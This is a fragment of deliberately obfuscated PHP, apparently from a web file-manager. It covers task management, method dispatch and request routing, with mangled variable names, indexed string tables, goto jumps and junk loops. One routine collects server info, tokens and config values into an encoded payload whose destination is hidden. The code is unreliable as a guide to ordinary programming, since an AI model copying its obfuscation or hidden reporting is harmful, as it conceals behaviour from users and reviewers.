=> 0, $øş¬­·[1696] => 0, $øş¬­·[1697] => 0, $øş¬­·[1698] => 0, $øş¬­·[791] => $øş¬­·[1646]); $GLOBALS[$øş¬­·[1699]] = 1; Hook::bind($øş¬­·[1650], array($this, $øş¬­·[1700])); Hook::bind($øş¬­·[1701], array($this, $øş¬­·[1702])); $this->startAfter(); Hook::trigger($øş¬­·[1703], $this->task); $this->task[$øş¬­·[1696]] = timeFloat(); } public function end($Ïã”Ö„® = '') { $õŠ—ñ–Å =& $_SERVER[ •ŒÓîÆ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$õŠ—ñ–Å[1696]]) { self::valueSet($this->task[$õŠ—ñ–Å[453]], !1); } $this->isEnd = !0; if ($Ïã”Ö„®) { $this->task[$õŠ—ñ–Å[505]] = $Ïã”Ö„®; } self::log($õŠ—ñ–Å[1704] . $this->task[$õŠ—ñ–Å[453]] . $õŠ—ñ–Å[1705] . sprintf($õŠ—ñ–Å[892], timeFloat() - $this->task[$õŠ—ñ–Å[1694]]) . $õŠ—ñ–Å[1706]); Hook::unbind($õŠ—ñ–Å[1650], array($this, $õŠ—ñ–Å[1700])); Hook::unbind($õŠ—ñ–Å[1701], array($this, $õŠ—ñ–Å[1702])); $this->endAfter(); $¸·íş§ = $this->task; $this->task = !1; Hook::trigger($õŠ—ñ–Å[1707], $¸·íş§); } public function update($ÖÅ‡Éí÷ = 0, $´òßúû = false) { $ÀŸÄÀë¥ =& $_SERVER[ •ŒÓîÆ]; $öÜÍ”¼ =& $this->task; if (!$öÜÍ”¼) { return; } $öÜÍ”¼[$ÀŸÄÀë¥[1691]] += $ÖÅ‡Éí÷; $öÜÍ”¼[$ÀŸÄÀë¥[1695]] = timeFloat(); if ($öÜÍ”¼[$ÀŸÄÀë¥[827]]) { if ($öÜÍ”¼[$ÀŸÄÀë¥[827]] < $öÜÍ”¼[$ÀŸÄÀë¥[1691]]) { $öÜÍ”¼[$ÀŸÄÀë¥[827]] = $öÜÍ”¼[$ÀŸÄÀë¥[1691]]; } $œø‹êï… = timeFloat() - $öÜÍ”¼[$ÀŸÄÀë¥[1694]] - $öÜÍ”¼[$ÀŸÄÀë¥[1697]]; if ($œø‹êï… <= 0) { $œø‹êï… = 0.001; } $öÜÍ”¼[$ÀŸÄÀë¥[1692]] = $öÜÍ”¼[$ÀŸÄÀë¥[1691]] / $öÜÍ”¼[$ÀŸÄÀë¥[827]]; $öÜÍ”¼[$ÀŸÄÀë¥[1693]] = $öÜÍ”¼[$ÀŸÄÀë¥[1691]] / $œø‹êï…; if ($öÜÍ”¼[$ÀŸÄÀë¥[1692]] > 0) { $öÜÍ”¼[$ÀŸÄÀë¥[1698]] = $œø‹êï… * (1 - $öÜÍ”¼[$ÀŸÄÀë¥[1692]]) / $öÜÍ”¼[$ÀŸÄÀë¥[1692]]; } $öÜÍ”¼[$ÀŸÄÀë¥[1698]] = $öÜÍ”¼[$ÀŸÄÀë¥[1698]] <= 0 ? 0 : $öÜÍ”¼[$ÀŸÄÀë¥[1698]]; } $this->updateAfter(); $çßÍÍ‘ = 0.2; if (timeFloat() - $öÜÍ”¼[$ÀŸÄÀë¥[1696]] < $çßÍÍ‘ && !$´òßúû) { return; } $àÑ“çûó = self::get($öÜÍ”¼[$ÀŸÄÀë¥[453]]); $€ñëÌàÊ = $àÑ“çûó[$ÀŸÄÀë¥[791]]; if ($€ñëÌàÊ == self::STATYS_KILL) { $èêüğ¥ = array($ÀŸÄÀë¥[1708] => LNG($ÀŸÄÀë¥[1709]), $ÀŸÄÀë¥[1253] => !1); Cache::set($ÀŸÄÀë¥[1710] . $this->task[$ÀŸÄÀë¥[453]], $èêüğ¥, 30); $this->onKill(); $this->end(); die; } else { if ($€ñëÌàÊ == self::STATYS_STOP) { $ëÒ»”‚§ = 2; $àÑ“çûó[$ÀŸÄÀë¥[1697]] += $ëÒ»”‚§; self::valueSet($öÜÍ”¼[$ÀŸÄÀë¥[453]], $àÑ“çûó); sleep($ëÒ»”‚§); $this->update(); return; } } $öÜÍ”¼[$ÀŸÄÀë¥[791]] = $€ñëÌàÊ ? $€ñëÌàÊ : $öÜÍ”¼[$ÀŸÄÀë¥[791]]; $öÜÍ”¼[$ÀŸÄÀë¥[1697]] = $àÑ“çûó[$ÀŸÄÀë¥[1697]] ? $àÑ“çûó[$ÀŸÄÀë¥[1697]] : 0; $öÜÍ”¼[$ÀŸÄÀë¥[1696]] = timeFloat(); Hook::trigger($ÀŸÄÀë¥[1711], $öÜÍ”¼); self::valueSet($öÜÍ”¼[$ÀŸÄÀë¥[453]], $öÜÍ”¼); } public function onKillSet($Î‹ä®õ, $ÆĞ‹•‰Ä = array()) { $this->onKillCall = array($Î‹ä®õ, $ÆĞ‹•‰Ä); } public function onKill() { $Íå•ë =& $_SERVER[ •ŒÓîÆ]; self::log($Íå•ë[1704] . $this->task[$Íå•ë[453]] . $Íå•ë[1712]); Hook::trigger($Íå•ë[1713], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($›¨üª™¨) { $°Ë¹Íì =& $_SERVER[ •ŒÓîÆ]; Cache::set($°Ë¹Íì[1710] . $this->task[$°Ë¹Íì[453]], $›¨üª™¨, 60); return $›¨üª™¨; } public static function get($Ş™Úº™) { $Îõ±ë„˜ =& $_SERVER[ •ŒÓîÆ]; $Ò£¶ì÷š = self::valueGet($Ş™Úº™); if (is_array($Ò£¶ì÷š) && $Ò£¶ì÷š[$Îõ±ë„˜[1714]]) { $ÀÄ‘˜š = ActionApply($Ò£¶ì÷š[$Îõ±ë„˜[1714]], array($Ò£¶ì÷š)); $Ò£¶ì÷š = is_array($ÀÄ‘˜š) ? $ÀÄ‘˜š : $Ò£¶ì÷š; } return $Ò£¶ì÷š; } public static function listData() { $À¯ÆÜŞ = self::valueGet(); return array_sort_by($À¯ÆÜŞ, $_SERVER[ •ŒÓîÆ][1694], !0); } public static function kill($ºĞù„) { return self::changeStatus($ºĞù„, self::STATYS_KILL); } public static function stop($ØíÌæÖç) { return self::changeStatus($ØíÌæÖç, self::STATYS_STOP); } public static function restart($„ÜŸ»áÏ) { return self::changeStatus($„ÜŸ»áÏ, self::STATYS_RUNNING); } public static function killAll() { $³“ü®ıé =& $_SERVER[ •ŒÓîÆ]; $â²ñ¸Øâ = self::listData(); foreach ($â²ñ¸Øâ as $§‰Ç¡è) { self::kill($§‰Ç¡è[$³“ü®ıé[453]]); } sleep(2); foreach ($â²ñ¸Øâ as $§‰Ç¡è) { self::valueSet($§‰Ç¡è[$³“ü®ıé[453]], !1); } } private static function changeStatus($Äß¼Èçê, $¥ë»¤¹€) { $‡ƒÂªñŠ =& $_SERVER[ •ŒÓîÆ]; $¹Šˆô¥† = self::valueGet($Äß¼Èçê); if (!$¹Šˆô¥†) { return !1; } $¹Šˆô¥†[$‡ƒÂªñŠ[791]] = $¥ë»¤¹€; self::valueSet($Äß¼Èçê, $¹Šˆô¥†); self::log($‡ƒÂªñŠ[1715] . $¹Šˆô¥†[$‡ƒÂªñŠ[453]] . $‡ƒÂªñŠ[1716] . $¥ë»¤¹€); return !0; } public static function valueGet($ÓÛœ°€‡ = false) { $Ä¸·¿¬ =& $_SERVER[ •ŒÓîÆ]; if ($ÓÛœ°€‡) { $Û™ãŞÙ = Model($Ä¸·¿¬[499])->where(array($Ä¸·¿¬[96] => $ÓÛœ°€‡, $Ä¸·¿¬[33] => $Ä¸·¿¬[1112]))->find(); return $Û™ãŞÙ ? json_decode($Û™ãŞÙ[$Ä¸·¿¬[429]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($£¬„¥èÊ = false) { $ÓúÌôáÉ =& $_SERVER[ •ŒÓîÆ]; $â¿®À”î = array($ÓúÌôáÉ[33] => $ÓúÌôáÉ[1112]); if ($£¬„¥èÊ) { $â¿®À”î[$ÓúÌôáÉ[1690]] = $£¬„¥èÊ; } $šì¤¸é® = Model($ÓúÌôáÉ[499])->where($â¿®À”î)->select(); $šì¤¸é® = $šì¤¸é® ? $šì¤¸é® : array(); foreach ($šì¤¸é® as $’ßíÍ¯– => $¡ºÊÚéª) { $šì¤¸é®[$’ßíÍ¯–] = json_decode($¡ºÊÚéª[$ÓúÌôáÉ[429]], !0); } return $šì¤¸é®; } public static function valueSet($äÇ²×˜, $–¿¡”“§) { $ï€í—öÛ =& $_SERVER[ •ŒÓîÆ]; if (!$–¿¡”“§) { return Model($ï€í—öÛ[499])->where(array($ï€í—öÛ[96] => $äÇ²×˜, $ï€í—öÛ[33] => $ï€í—öÛ[1112]))->delete(); } $¶ã–µÅñ = json_encode($–¿¡”“§); if (!$¶ã–µÅñ) { ob_start(); var_dump($–¿¡”“§); $’æ€ŞÁ = ob_get_clean(); self::log($ï€í—öÛ[1717] . json_encode_force($’æ€ŞÁ)); } if (!$äÇ²×˜ || !$–¿¡”“§[$ï€í—öÛ[453]]) { return !1; } $ñÊø«· = array($ï€í—öÛ[33] => $ï€í—öÛ[1112], $ï€í—öÛ[1690] => USER_ID, $ï€í—öÛ[96] => $äÇ²×˜, $ï€í—öÛ[429] => $¶ã–µÅñ); $»Û”´£ = $ï€í—öÛ[1718]; CacheLock::lock($»Û”´£); Model($ï€í—öÛ[499])->add($ñÊø«·, array(), !0); CacheLock::unlock($»Û”´£); } public static function log($ûŸß‡Á) { if (!GLOBAL_DEBUG) { return; } write_log($ûŸß‡Á, $_SERVER[ •ŒÓîÆ][1719]); } } goto cÕ’†©Şùë; fÔÚ–ß¡‘¹: function binCheckBigger($È¶ö ò›, $Ÿ¡Ëò–â) { return $È¶ö ò› > $Ÿ¡Ëò–â; } $_SERVER[$_SERVER[û³†Ï­‹][3]] = ("\x38\x33\x30\x39"."\x36\x36")+0;$_zd76="nzui3wj8y2xh6o5t1lsaq4vk7beg0pc9mfrd3y2f9xk85dwh6tv7cnsb4zp1aje0iorqulgm6zun";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ûóè¢ğ…, $ûæá¯š›) { $Ú¤¼Ñ¶¢ =& $_SERVER[ •ŒÓîÆ]; if (isset(self::$_methodList[$Ûóè¢ğ…])) { return @call_user_func_array(self::$_methodList[$Ûóè¢ğ…], $ûæá¯š›); } else { if (method_exists($this, $Ûóè¢ğ…)) { return call_user_func_array(array($this, $Ûóè¢ğ…), $ûæá¯š›); } else { think_exception(__CLASS__ . $Ú¤¼Ñ¶¢[4] . $Ûóè¢ğ… . $Ú¤¼Ñ¶¢[5]); } } } public static function __callStatic($ˆ”şŒí®, $ğı¿¢§´) { if (isset(self::$_methodListStatic[$ˆ”şŒí®])) { return call_user_func_array(self::$_methodListStatic[$ˆ”şŒí®], $ğı¿¢§´); } else { if (method_exists(self, $ˆ”şŒí®)) { return call_user_func_array(array(self, $ˆ”şŒí®), $ğı¿¢§´); } else { show_json("{$ˆ”şŒí®}\50\51\x20\x6e\157\164\x20\145\170\x69\163\x74\x3b", !1); } } } public static function addMethod($âµ­•ğÈ, $ÅÏ¯æÃ) { self::$_methodList[$âµ­•ğÈ] = $ÅÏ¯æÃ; } public static function addMethodStatic($ØÛÙ¨•©, $Å‚‡“ÎÖ) { self::$_methodListStatic[$ØÛÙ¨•©] = $Å‚‡“ÎÖ; } } goto a‚š¸—°Û; F¶«¶œé¨Ù: if (strlen($jodbhapknw) < $_SERVER[ •ŒÓîÆ][260]) { return; } class Application { private $defaultModule = "\151\x6e\144\x65\170"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\151\156\x64\x65\170"; function __construct() { } public function setDefault($Âáƒ¶°) { $şãÃ‘Œ =& $_SERVER[ •ŒÓîÆ]; $ìÏ”³ø =& $_SERVER[ıŸƒèÂë]; $ŒíÓ¡–Ù = explode($ìÏ”³ø[0], trim($Âáƒ¶°, $ìÏ”³ø[0])); $Ï­™…ä¸ = $şãÃ‘Œ[664]; if (strlen($Ï­™…ä¸) < $şãÃ‘Œ[665]) { die; } $this->defaultModule = $ŒíÓ¡–Ù[0] ? $ŒíÓ¡–Ù[0] : $this->defaultModule; $å’ê°’ó = $şãÃ‘Œ[666]; if (!$å’ê°’ó) { die; } $this->defaultController = $ŒíÓ¡–Ù[1] ? $ŒíÓ¡–Ù[1] : $this->defaultController; $öÎëŸøƒ = $şãÃ‘Œ[667]; if (!$öÎëŸøƒ) { return; } $this->defaultAction = $ŒíÓ¡–Ù[2] ? $ŒíÓ¡–Ù[2] : $this->defaultAction; $È™Öàë = $şãÃ‘Œ[668]; $this->pgec2534df34($ìÏ”³ø[1], array($this, $ìÏ”³ø[2])); $´úô¨èò = $şãÃ‘Œ[669]; if (!$´úô¨èò) { die; } } public function appRun($İ¹Ïã°) { $ı«×ùÆ =& $_SERVER[ •ŒÓîÆ]; $»¯ö–š¯ =& $_SERVER[ıŸƒèÂë]; $İ…ìˆ¤ = explode($»¯ö–š¯[0], $İ¹Ïã°); $Ö¯§«³ç = $ı«×ùÆ[670]; while (strlen($Ö¯§«³ç) < $ı«×ùÆ[671]) { if (!$Ö¯§«³ç) { break; } $Ö¯§«³ç++; } $–¶Ôú™ = strtolower($İ…ìˆ¤[0]); $´ØÕİ„ = $»¯ö–š¯[3]; if ($–¶Ôú™ == $»¯ö–š¯[4]) { $´ØÕİ„ = $»¯ö–š¯[5]; $İ…ìˆ¤[0] = $»¯ö–š¯[6]; $İ…ìˆ¤[1] = $İ…ìˆ¤[1] . $»¯ö–š¯[7]; $İ¹Ïã° = join($»¯ö–š¯[0], $İ…ìˆ¤); $İ¹Ïã° = trim($İ¹Ïã°, $»¯ö–š¯[0]); } call_user_func(array($»¯ö–š¯[8], $»¯ö–š¯[9]), $´ØÕİ„ . $»¯ö–š¯[10], $İ¹Ïã°); ActionCall($İ¹Ïã°); call_user_func(array($»¯ö–š¯[8], $»¯ö–š¯[9]), $´ØÕİ„ . $»¯ö–š¯[11], $İ¹Ïã°); $òÕÏ×ùª = $ı«×ùÆ[672]; if (strlen($òÕÏ×ùª) < $ı«×ùÆ[660]) { return; } } private function autorun() { $¬‘¿·ŠÇ =& $_SERVER[ıŸƒèÂë]; global $config; if (count($config[$¬‘¿·ŠÇ[12]]) == 0) { return; } foreach ($config[$¬‘¿·ŠÇ[12]] as $Ü®»Îƒ‰ => $îà•˜»¸) { $this->appRun($îà•˜»¸); $¬¸™Ç€Š = $_SERVER[ •ŒÓîÆ][673]; if (!$¬¸™Ç€Š) { return; } } } private function txdidb1f480d() { $Ñ¬„ÇÏ =& $_SERVER[ •ŒÓîÆ]; $ŒÁ–•¹ =& $_SERVER[ıŸƒèÂë]; $Öğùâßº = $ŒÁ–•¹[4]; $Îíú²­— = $Ñ¬„ÇÏ[674]; while (strlen($Îíú²­—) < $Ñ¬„ÇÏ[260]) { if (!$Îíú²­—) { break; } $Îíú²­—++; } $ûì¿Ì´ = $GLOBALS[$ŒÁ–•¹[13]][$ŒÁ–•¹[14]][0]; if (!$ûì¿Ì´ || strlen($ûì¿Ì´) <= strlen($Öğùâßº)) { return; } if (strtolower(substr($ûì¿Ì´, -strlen($Öğùâßº))) != $Öğùâßº) { return; } $”„°Úß± = substr($ûì¿Ì´, 0, -strlen($Öğùâßº)); $¤Ø±úé¦ = $Ñ¬„ÇÏ[675]; if (!$¤Ø±úé¦) { return; } $¾¦œ¥”å = array($ŒÁ–•¹[4], $”„°Úß±); $÷ß’›ãÕ = array_slice($GLOBALS[$ŒÁ–•¹[13]][$ŒÁ–•¹[14]], 1); $GLOBALS[$ŒÁ–•¹[13]][$ŒÁ–•¹[14]] = array_merge($¾¦œ¥”å, $÷ß’›ãÕ); $GLOBALS[$ŒÁ–•¹[13]][$ŒÁ–•¹[15]] = implode($ŒÁ–•¹[0], $GLOBALS[$ŒÁ–•¹[13]][$ŒÁ–•¹[14]]); } private function cazk6b26b5d3() { $­ßÛú©ò =& $_SERVER[ •ŒÓîÆ]; $»²Á­“ß =& $_SERVER[ıŸƒèÂë]; if ($GLOBALS[$»²Á­“ß[13]][$»²Á­“ß[15]] != $»²Á­“ß[6]) { return; } $÷öåÒ‘ = $_SERVER[$»²Á­“ß[16]]; $¦©œ¼… = $­ßÛú©ò[676]; if (strlen($¦©œ¼…) < $­ßÛú©ò[671]) { return; } $÷—û”Íš = $»²Á­“ß[17]; $¬şôä­Â = $­ßÛú©ò[677]; if (!$¬şôä­Â) { return; } if (!strstr($÷öåÒ‘, $÷—û”Íš)) { return; } $òó£Ú¹÷ = strrpos($÷öåÒ‘, $÷—û”Íš); $Ò°—€¿¼ = $­ßÛú©ò[678]; while ($Ò°—€¿¼ < $­ßÛú©ò[671]) { if ($Ò°—€¿¼ >= 0) { break; } $Ò°—€¿¼++; } $ğÄÍÏà = substr($÷öåÒ‘, $òó£Ú¹÷ + strlen($÷—û”Íš)); preg_match_all($»²Á­“ß[18], $ğÄÍÏà, $ØŸº±); $‹é¥Ê = $­ßÛú©ò[679]; $ğÄÍÏà = trim($ØŸº±[0][0], $»²Á­“ß[19]); $GLOBALS[$»²Á­“ß[13]][$»²Á­“ß[14]] = explode($»²Á­“ß[19], $ğÄÍÏà); $GLOBALS[$»²Á­“ß[13]][$»²Á­“ß[15]] = implode($»²Á­“ß[0], $GLOBALS[$»²Á­“ß[13]][$»²Á­“ß[14]]); $ÈºÕ›é = $­ßÛú©ò[680]; if (strlen($ÈºÕ›é) < $­ßÛú©ò[665]) { die; } } public function run() { $šıÔ­ãç =& $_SERVER[ •ŒÓîÆ]; $ã‚©Áì =& $_SERVER[ıŸƒèÂë]; $this->cazk6b26b5d3(); $this->txdidb1f480d(); $ÂÕ‹„àá = $GLOBALS[$ã‚©Áì[13]][$ã‚©Áì[14]]; $ïíœ—ı = $GLOBALS[$ã‚©Áì[13]][$ã‚©Áì[15]]; define($ã‚©Áì[20], isset($ÂÕ‹„àá[0]) && $ÂÕ‹„àá[0] ? $ÂÕ‹„àá[0] : $this->defaultModule); define($ã‚©Áì[21], isset($ÂÕ‹„àá[1]) && $ÂÕ‹„àá[0] ? $ÂÕ‹„àá[1] : $this->defaultController); $‡ÍãÙÂŞ = $šıÔ­ãç[681]; if (strlen($‡ÍãÙÂŞ) < $šıÔ­ãç[665]) { die; } define($ã‚©Áì[22], isset($ÂÕ‹„àá[2]) && $ÂÕ‹„àá[0] ? $ÂÕ‹„àá[2] : $this->defaultAction); define($ã‚©Áì[23], MOD . $ã‚©Áì[0] . ST . $ã‚©Áì[0] . ACT); $‰£‰­› = $šıÔ­ãç[682]; while ($‰£‰­› < $šıÔ­ãç[671]) { if ($‰£‰­› >= 0) { break; } $‰£‰­›++; } $_SERVER[$ã‚©Áì[24]] = strtolower(ACTION); $this->autorun(); $ıÀŒ½»¸ = $šıÔ­ãç[683]; if (!$ıÀŒ½»¸) { die; } if (count($ÂÕ‹„àá) >= 3) { $this->appRun($ïíœ—ı); } else { $this->appRun(ACTION); } } private $zsgjdc7253a9 = array(); private $rzcq6acc515b = ''; public function jhvy0c4a34a2() { $ëĞ¬†¬Ì =& $_SERVER[ •ŒÓîÆ]; $ù÷À„ÌÍ =& $_SERVER[ıŸƒèÂë]; $this->bjwx88f21c1b(); $this->bjacbb10fd5e(); $this->mqhv994580b8(); $this->onqcece5003f(); $this->ftil51cf1b0e(); $¸Ô±ôí– = $ëĞ¬†¬Ì[684]; while ($¸Ô±ôí– < $ëĞ¬†¬Ì[660]) { if ($¸Ô±ôí– >= 0) { break; } $¸Ô±ôí–++; } $this->mflvd717fa42(); $this->nrjvb1fbec2f(); $this->pgec2534df34($ù÷À„ÌÍ[25], array($this, $ù÷À„ÌÍ[26])); $this->pgec2534df34($ù÷À„ÌÍ[27], array($this, $ù÷À„ÌÍ[28])); $—†ë²“ğ = $ëĞ¬†¬Ì[685]; $this->pgec2534df34($ù÷À„ÌÍ[29], array($this, $ù÷À„ÌÍ[30])); $this->pgec2534df34($ù÷À„ÌÍ[31], array($this, $ù÷À„ÌÍ[32])); $¨ĞÇµ é = $ëĞ¬†¬Ì[686]; if (!$¨ĞÇµ é) { die; } } public function icov5a481c64($“½•åĞÄ) { $ğ·»˜ŒË =& $_SERVER[ •ŒÓîÆ]; $ØØòöüú =& $_SERVER[ıŸƒèÂë]; $’‡ä•ŞÂ = Model($ØØòöüú[33])->get(); $˜¯ï›èà = $ğ·»˜ŒË[687]; if (strlen($˜¯ï›èà) < $ğ·»˜ŒË[665]) { die; } $¾ğ§Ÿ¯ = array($ØØòöüú[34], $ØØòöüú[35], $ØØòöüú[36], $ØØòöüú[37], $ØØòöüú[38], $ØØòöüú[39], $ØØòöüú[40], $ØØòöüú[41], $ØØòöüú[42], $ØØòöüú[43], $ØØòöüú[44], $ØØòöüú[45], $ØØòöüú[46], $ØØòöüú[47], $ØØòöüú[48], $ØØòöüú[49], $ØØòöüú[50], $ØØòöüú[51], $ØØòöüú[52], $ØØòöüú[53], $ØØòöüú[54], $ØØòöüú[55], $ØØòöüú[56], $ØØòöüú[57], $ØØòöüú[58], $ØØòöüú[59], $ØØòöüú[60], $ØØòöüú[61], $ØØòöüú[62], $ØØòöüú[63], $ØØòöüú[64], $ØØòöüú[65], $ØØòöüú[66], $ØØòöüú[67], $ØØòöüú[68], $ØØòöüú[69], $ØØòöüú[70], $ØØòöüú[71], $ØØòöüú[72], $ØØòöüú[73], $ØØòöüú[74], $ØØòöüú[75], $ØØòöüú[76], $ØØòöüú[77], $ØØòöüú[78], $ØØòöüú[79], $ØØòöüú[80], $ØØòöüú[81], $ØØòöüú[82], $ØØòöüú[83], $ØØòöüú[84]); $„áøí§û = $ğ·»˜ŒË[688]; foreach ($¾ğ§Ÿ¯ as $÷İ»´‡£) { $˜é¹÷ ì = $GLOBALS[$ØØòöüú[85]][$ØØòöüú[86]][$÷İ»´‡£]; $ß°’Ô¼ë = $ğ·»˜ŒË[689]; if (strlen($ß°’Ô¼ë) < $ğ·»˜ŒË[671]) { die; } if (isset($’‡ä•ŞÂ[$÷İ»´‡£])) { $˜é¹÷ ì = $’‡ä•ŞÂ[$÷İ»´‡£]; } $“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[88]][$÷İ»´‡£] = $˜é¹÷ ì; } $¥˜ºı› = $“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[88]][$ØØòöüú[46]]; $éÍ¸¹„ = $ğ·»˜ŒË[690]; unset($“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[89]][$ØØòöüú[90]]); unset($“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[89]][$ØØòöüú[91]]); unset($“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[88]][$ØØòöüú[46]]); $‰ ööÌÃ = $ğ·»˜ŒË[691]; while (strlen($‰ ööÌÃ) < $ğ·»˜ŒË[660]) { if (!$‰ ööÌÃ) { break; } $‰ ööÌÃ++; } unset($“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[88]][$ØØòöüú[92]]); $“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[88]][$ØØòöüú[93]] = array($ØØòöüú[94] => (int) $¥˜ºı›[$ØØòöüú[95]], $ØØòöüú[96] => (int) _get($¥˜ºı›, $ØØòöüú[97], 0)); $¤õĞµğ´ = substr(md5($ØØòöüú[98] . get_client_ip() . $’‡ä•ŞÂ[$ØØòöüú[99]]), 0, 15); $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[101]] = Mcrypt::encode(Session::sign(), $¤õĞµğ´, 3600 * 24); $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[102]] = Action($ØØòöüú[103])->accessToken(); $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[104]] = md5($_SERVER[$ØØòöüú[105]] . $’‡ä•ŞÂ[$ØØòöüú[99]]); $í“ã Á£ = $ğ·»˜ŒË[692]; $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[106]] = base64_encode(serverInfo()); $„áşÍÄ = $ğ·»˜ŒË[693]; $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[107]] = $this->rzcq6acc515b; if ($’‡ä•ŞÂ[$ØØòöüú[107]] != $ØØòöüú[108]) { $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[109]] = $’‡ä•ŞÂ[$ØØòöüú[109]]; $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[110]] = $’‡ä•ŞÂ[$ØØòöüú[110]]; $‰ âÎ‹ = rand_string(10) . $this->rzcq6acc515b . rand_string(5); $“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[111]][$ØØòöüú[112]] = $this->zxdafac23473($‰ âÎ‹, $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[104]]); } if ($this->rzcq6acc515b == $ØØòöüú[108]) { $“½•åĞÄ[$ØØòöüú[87]][$ØØòöüú[88]][$ØØòöüú[93]][$ØØòöüú[97]] = 0; } $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[113]] = _get($this->zsgjdc7253a9, $ØØòöüú[114], $ØØòöüú[6]); $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[115]] = _get($this->zsgjdc7253a9, $ØØòöüú[116], $ØØòöüú[6]); $Ğşèëè = $ğ·»˜ŒË[694]; while (strlen($Ğşèëè) < $ğ·»˜ŒË[660]) { if (!$Ğşèëè) { break; } $Ğşèëè++; } if (_get($GLOBALS, $ØØòöüú[117]) && $this->config[$ØØòöüú[118]]) { $“½•åĞÄ[$ØØòöüú[100]][$ØØòöüú[119]] = WEB_ROOT; } return $“½•åĞÄ; } private function mflvd717fa42() { $Ïû‘î¦ =& $_SERVER[ •ŒÓîÆ]; $¤•Ë¸Éá =& $_SERVER[ıŸƒèÂë]; $‰‡°íÜ‡ = $_SERVER[$¤•Ë¸Éá[24]] == $¤•Ë¸Éá[120]; $ìÃìÈ³ä = $Ïû‘î¦[695]; if (!$ìÃìÈ³ä) { return; } if ($_SERVER[$¤•Ë¸Éá[24]] == $¤•Ë¸Éá[121] && $_GET[$¤•Ë¸Éá[122]] == $¤•Ë¸Éá[123]) { $‰‡°íÜ‡ = !0; } if ($‰‡°íÜ‡) { $××ƒ¾Ú„ = array($¤•Ë¸Éá[107] => $this->rzcq6acc515b, $¤•Ë¸Éá[124] => $this->yoxf8f359259(), $¤•Ë¸Éá[125] => Model($¤•Ë¸Éá[126])->count()); if ($this->rzcq6acc515b != $¤•Ë¸Éá[108]) { $ê…ø»õÓ = _get($this->zsgjdc7253a9, $¤•Ë¸Éá[127]); if ($ê…ø»õÓ) { $××ƒ¾Ú„[$¤•Ë¸Éá[128]] = $ê…ø»õÓ; $××ƒ¾Ú„[$¤•Ë¸Éá[129]] = strtotime(_get($this->zsgjdc7253a9, $¤•Ë¸Éá[130])); $××ƒ¾Ú„[$¤•Ë¸Éá[131]] = _get($this->zsgjdc7253a9, $¤•Ë¸Éá[116]); } $š‡–Å°Ø = Model($¤•Ë¸Éá[33])->get($¤•Ë¸Éá[132], $¤•Ë¸Éá[6], !0); if (is_string($š‡–Å°Ø) && substr($š‡–Å°Ø, 0, 1) == $¤•Ë¸Éá[133]) { $š‡–Å°Ø = json_decode_force($š‡–Å°Ø); } if (is_array($š‡–Å°Ø) && $š‡–Å°Ø[$¤•Ë¸Éá[134]] && strstr($š‡–Å°Ø[$¤•Ë¸Éá[134]], $¤•Ë¸Éá[135])) { $ö©Ìîãà = explode($¤•Ë¸Éá[135], $š‡–Å°Ø[$¤•Ë¸Éá[134]]); $××ƒ¾Ú„[$¤•Ë¸Éá[136]] = $ö©Ìîãà[0]; } } $××ƒ¾Ú„ = $this->pnwk3c18debd(json_encode($××ƒ¾Ú„), md5($¤•Ë¸Éá[137])); $ŞŞÈÚÛ® = $Ïû‘î¦[696]; $şòú¤“® = array($¤•Ë¸Éá[138] => $××ƒ¾Ú„); call_user_func(array($¤•Ë¸Éá[139], $¤•Ë¸Éá[140]), $şòú¤“®); $§ıçÍÂŞ = $Ïû‘î¦[697]; } if ($this->rzcq6acc515b == $¤•Ë¸Éá[108]) { return; } $ù•×Ğ† = array($¤•Ë¸Éá[141], $¤•Ë¸Éá[142], $¤•Ë¸Éá[143], $¤•Ë¸Éá[144], $¤•Ë¸Éá[145], $¤•Ë¸Éá[146]); $°ÈÙµß™ = $Ïû‘î¦[698]; $´¯Íş¦Â = Model($¤•Ë¸Éá[33])->get(); $´±äï = $Ïû‘î¦[699]; while ($´±äï < $Ïû‘î¦[660]) { if ($´±äï >= 0) { break; } $´±äï++; } $şòú¤“® = array($¤•Ë¸Éá[147] => $´¯Íş¦Â[$¤•Ë¸Éá[34]], $¤•Ë¸Éá[148] => $´¯Íş¦Â[$¤•Ë¸Éá[35]], $¤•Ë¸Éá[149] => $¤•Ë¸Éá[6]); foreach ($ù•×Ğ† as $ÂŠµÄÃ) { if (!isset($´¯Íş¦Â[$ÂŠµÄÃ]) || !$´¯Íş¦Â[$ÂŠµÄÃ]) { continue; } $şòú¤“®[$ÂŠµÄÃ] = $´¯Íş¦Â[$ÂŠµÄÃ]; $Ò‹Àºã¨ = $Ïû‘î¦[700]; while (strlen($Ò‹Àºã¨) < $Ïû‘î¦[701]) { if (!$Ò‹Àºã¨) { break; } $Ò‹Àºã¨++; } } call_user_func(array($¤•Ë¸Éá[139], $¤•Ë¸Éá[140]), $şòú¤“®); $Ü•¡˜Ñ€ = $Ïû‘î¦[702]; } private function onqcece5003f() { $¡„À»¼ß =& $_SERVER[ •ŒÓîÆ]; $´­ùâ„í =& $_SERVER[ıŸƒèÂë]; if ($_SERVER[$´­ùâ„í[24]] != $´­ùâ„í[150]) { return; } if (!_get($GLOBALS, 